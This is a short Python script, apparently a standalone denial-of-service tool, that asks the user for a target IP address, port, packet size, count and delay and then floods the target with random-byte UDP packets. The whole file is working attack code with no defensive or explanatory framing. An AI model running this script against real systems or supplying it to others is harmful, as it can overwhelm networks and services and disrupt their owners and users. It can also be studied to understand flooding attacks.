import socket
import random
import time

class UDPFlooder:
    def __init__(self, ip: str, port: int, sleep_time: float):
        self.ip = ip
        self.port = port
        self.sleep_time = sleep_time
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def flood(self, packet_size: int, num_packets: int):
        self.socket.connect((self.ip, self.port))
        for i in range(1, num_packets + 1):
            packet = random._urandom(packet_size)
            self.socket.send(packet)
            print(f"Sent packet: {i}", end='\r')
            time.sleep(self.sleep_time)

if __name__ == '__main__':
    ip = input("Target IP: ")
    port = int(input("Target Port: "))
    sleep_time = float(input("Sleep Time (in seconds): "))
    packet_size = int(input("Packet Size (in bytes): "))
    num_packets = int(input("Number of Packets: "))

    udp_flooder = UDPFlooder(ip, port, sleep_time)
    udp_flooder.flood(packet_size, num_packets)
